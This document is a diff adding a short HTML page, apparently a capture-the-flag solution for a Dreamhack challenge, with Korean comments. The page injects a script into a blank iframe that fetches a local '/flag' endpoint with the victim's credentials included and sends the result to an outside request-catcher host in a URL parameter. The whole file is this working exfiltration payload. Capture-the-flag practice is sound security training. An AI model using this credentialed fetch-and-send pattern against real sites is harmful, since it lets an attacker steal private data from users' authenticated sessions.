@@ -1,0 +1,16 @@
+<html>
+<head></head>
+<body>
+<iframe src="about:blank" id="myIframe"></iframe>
+<script>
+    const iframe = document.getElementById('myIframe');
+    const iframeDocument = iframe.contentWindow.document;
+
+    // 새로운 스크립트 엘리먼트 생성
+    const script = iframeDocument.createElement('script');
+    script.textContent = "fetch('http://127.0.0.1:3000/flag', {method: 'GET',credentials: 'include'}).then(res => res.text()).then(flag => fetch(`https://rpfccfz.request.dreamhack.games?flag=${flag}`));";
+    // 스크립트 엘리먼트를 iframe의 body에 추가
+    iframeDocument.body.appendChild(script);
+</script>
+</body>
+</html>
